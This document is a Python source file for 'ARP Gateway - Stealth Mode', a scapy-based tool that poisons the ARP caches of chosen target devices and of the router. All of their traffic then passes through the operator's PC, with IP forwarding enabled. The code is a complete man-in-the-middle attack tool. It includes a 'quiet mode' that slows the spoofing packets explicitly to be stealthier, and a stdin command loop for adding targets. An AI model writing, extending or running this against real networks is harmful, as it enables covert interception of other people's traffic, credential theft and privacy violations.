"""
ARP Gateway - Stealth Mode
Makes your PC act as the network gateway using ARP spoofing
All traffic from target devices flows through your PC
"""

import json
import sys
import time
import threading
from datetime import datetime
from typing import List, Optional, Dict, Set, Callable
from dataclasses import dataclass, asdict

from scapy.all import (
    ARP, Ether, sendp, getmacbyip, get_if_hwaddr,
    conf, srp
)


@dataclass
class TargetDevice:
    """A device being monitored via ARP spoofing"""
    ip: str
    mac: str
    hostname: Optional[str] = None
    last_seen: Optional[str] = None
    active: bool = True


class ARPGateway:
    """
    ARP-based Transparent Gateway
    Intercepts traffic by ARP spoofing target devices
    """
    
    def __init__(
        self,
        interface: str,
        gateway_ip: Optional[str] = None,
        targets: Optional[List[str]] = None,
        quiet_mode: bool = True,
        spoof_interval: int = 15,
        callback: Optional[Callable[[Dict], None]] = None
    ):
        """
        Initialize ARP Gateway
        
        Args:
            interface: Network interface
            gateway_ip: Gateway IP (auto-detected if not provided)
            targets: List of target IPs to spoof
            quiet_mode: If True, reduce ARP packet frequency
            spoof_interval: Seconds between ARP packets (higher = stealthier)
            callback: Function to call with status updates
        """
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac: Optional[str] = None
        self.our_mac = get_if_hwaddr(interface)
        self.targets: Dict[str, TargetDevice] = {}
        self.quiet_mode = quiet_mode
        self.spoof_interval = spoof_interval if quiet_mode else 2
        self.callback = callback or self._default_callback
        self.running = False
        self.spoof_thread: Optional[threading.Thread] = None
        
        # Disable Scapy verbosity
        conf.verb = 0
        
        # Add initial targets
        if targets:
            for ip in targets:
                self.add_target(ip)
    
    def _default_callback(self, data: Dict):
        """Default callback - print JSON to stdout"""
        print(json.dumps(data), flush=True)
    
    def _get_gateway(self) -> Optional[str]:
        """Auto-detect gateway IP"""
        if self.gateway_ip:
            return self.gateway_ip
        
        try:
            import subprocess
            result = subprocess.run(
                ['ipconfig'],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            import re
            for line in result.stdout.split('\n'):
                if 'Default Gateway' in line:
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if match:
                        return match.group(1)
        except Exception:
            pass
        
        return None
    
    def _get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for an IP using ARP"""
        try:
            # First check if we already have it
            if ip in self.targets and self.targets[ip].mac:
                return self.targets[ip].mac
            
            # Send ARP request
            mac = getmacbyip(ip)
            return mac
        except Exception:
            return None
    
    def add_target(self, ip: str, hostname: Optional[str] = None) -> bool:
        """
        Add a target device to monitor
        
        Args:
            ip: Target IP address
            hostname: Optional hostname
            
        Returns:
            True if successfully added
        """
        mac = self._get_mac(ip)
        if not mac:
            self.callback({
                "type": "error",
                "message": f"Could not get MAC for {ip}"
            })
            return False
        
        self.targets[ip] = TargetDevice(
            ip=ip,
            mac=mac.upper(),
            hostname=hostname,
            last_seen=datetime.now().isoformat(),
            active=True
        )
        
        self.callback({
            "type": "target_added",
            "ip": ip,
            "mac": mac.upper(),
            "hostname": hostname
        })
        
        return True
    
    def remove_target(self, ip: str):
        """Remove a target and restore its ARP table"""
        if ip in self.targets:
            target = self.targets[ip]
            # Restore original ARP entry
            self._restore_target(ip, target.mac)
            del self.targets[ip]
            
            self.callback({
                "type": "target_removed",
                "ip": ip
            })
    
    def _spoof_target(self, target_ip: str, target_mac: str):
        """
        Send ARP packet to target saying we are the gateway
        
        Args:
            target_ip: Target device IP
            target_mac: Target device MAC
        """
        # Tell target: "I am the gateway"
        packet = Ether(dst=target_mac) / ARP(
            op=2,  # ARP reply
            pdst=target_ip,
            hwdst=target_mac,
            psrc=self.gateway_ip,
            hwsrc=self.our_mac
        )
        sendp(packet, iface=self.interface, verbose=False)
    
    def _spoof_gateway(self, target_ip: str, target_mac: str):
        """
        Send ARP packet to gateway saying we are the target
        This ensures return traffic comes through us too
        """
        packet = Ether(dst=self.gateway_mac) / ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=target_ip,
            hwsrc=self.our_mac
        )
        sendp(packet, iface=self.interface, verbose=False)
    
    def _restore_target(self, target_ip: str, target_mac: str):
        """Restore original ARP mapping for target"""
        # Tell target the real gateway MAC
        packet = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac
        )
        sendp(packet, iface=self.interface, verbose=False, count=3)
        
        # Tell gateway the real target MAC
        packet = Ether(dst=self.gateway_mac) / ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=target_ip,
            hwsrc=target_mac
        )
        sendp(packet, iface=self.interface, verbose=False, count=3)
    
    def _spoof_loop(self):
        """Main spoofing loop"""
        while self.running:
            for ip, target in list(self.targets.items()):
                if target.active:
                    try:
                        self._spoof_target(ip, target.mac)
                        self._spoof_gateway(ip, target.mac)
                        target.last_seen = datetime.now().isoformat()
                    except Exception as e:
                        self.callback({
                            "type": "spoof_error",
                            "ip": ip,
                            "error": str(e)
                        })
            
            time.sleep(self.spoof_interval)
    
    def start(self) -> bool:
        """Start ARP gateway"""
        # Get gateway info
        self.gateway_ip = self._get_gateway()
        if not self.gateway_ip:
            self.callback({
                "type": "error",
                "message": "Could not detect gateway IP"
            })
            return False
        
        self.gateway_mac = self._get_mac(self.gateway_ip)
        if not self.gateway_mac:
            self.callback({
                "type": "error",
                "message": "Could not get gateway MAC"
            })
            return False
        
        # Enable IP forwarding
        from .ip_forwarding import enable_ip_forwarding
        enable_ip_forwarding(self.interface)
        
        self.running = True
        
        # Start spoofing thread
        self.spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.spoof_thread.start()
        
        self.callback({
            "type": "started",
            "interface": self.interface,
            "gateway_ip": self.gateway_ip,
            "gateway_mac": self.gateway_mac,
            "our_mac": self.our_mac,
            "targets": [asdict(t) for t in self.targets.values()],
            "quiet_mode": self.quiet_mode,
            "spoof_interval": self.spoof_interval
        })
        
        return True
    
    def stop(self):
        """Stop ARP gateway and restore network"""
        self.running = False
        
        # Wait for spoof thread to stop
        if self.spoof_thread:
            self.spoof_thread.join(timeout=self.spoof_interval + 1)
        
        # Restore all targets
        for ip, target in self.targets.items():
            try:
                self._restore_target(ip, target.mac)
            except Exception:
                pass
        
        # Disable IP forwarding
        from .ip_forwarding import disable_ip_forwarding
        disable_ip_forwarding(self.interface)
        
        self.callback({
            "type": "stopped",
            "restored_targets": list(self.targets.keys())
        })
    
    def get_targets(self) -> List[Dict]:
        """Get list of current targets"""
        return [asdict(t) for t in self.targets.values()]
    
    def set_quiet_mode(self, enabled: bool, interval: int = 15):
        """Enable/disable quiet mode"""
        self.quiet_mode = enabled
        self.spoof_interval = interval if enabled else 2
        
        self.callback({
            "type": "config_changed",
            "quiet_mode": enabled,
            "spoof_interval": self.spoof_interval
        })


def start_gateway(
    interface: str,
    targets: List[str],
    gateway_ip: Optional[str] = None,
    quiet_mode: bool = True
) -> ARPGateway:
    """
    Quick function to start ARP gateway
    
    Args:
        interface: Network interface
        targets: Target IPs to monitor
        gateway_ip: Gateway IP (auto-detect if None)
        quiet_mode: Enable quiet mode
        
    Returns:
        ARPGateway instance
    """
    gateway = ARPGateway(
        interface=interface,
        gateway_ip=gateway_ip,
        targets=targets,
        quiet_mode=quiet_mode
    )
    gateway.start()
    return gateway


# CLI interface
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="ARP Gateway")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--gateway", "-g", help="Gateway IP (auto-detect if not provided)")
    parser.add_argument("--targets", "-t", nargs="*", default=[], help="Target IPs")
    parser.add_argument("--quiet", "-q", action="store_true", default=True, help="Quiet mode")
    parser.add_argument("--interval", type=int, default=15, help="Spoof interval (seconds)")
    
    args = parser.parse_args()
    
    gateway = ARPGateway(
        interface=args.interface,
        gateway_ip=args.gateway,
        targets=args.targets,
        quiet_mode=args.quiet,
        spoof_interval=args.interval
    )
    
    try:
        if not gateway.start():
            sys.exit(1)
        
        # Handle stdin commands
        while gateway.running:
            try:
                line = sys.stdin.readline().strip()
                if line:
                    cmd = json.loads(line)
                    action = cmd.get("action")
                    
                    if action == "stop":
                        break
                    elif action == "add_target":
                        gateway.add_target(cmd["ip"], cmd.get("hostname"))
                    elif action == "remove_target":
                        gateway.remove_target(cmd["ip"])
                    elif action == "get_targets":
                        print(json.dumps({"targets": gateway.get_targets()}), flush=True)
                    elif action == "set_quiet":
                        gateway.set_quiet_mode(cmd.get("enabled", True), cmd.get("interval", 15))
                        
            except json.JSONDecodeError:
                pass
            except EOFError:
                break
                
    except KeyboardInterrupt:
        pass
    finally:
        gateway.stop()
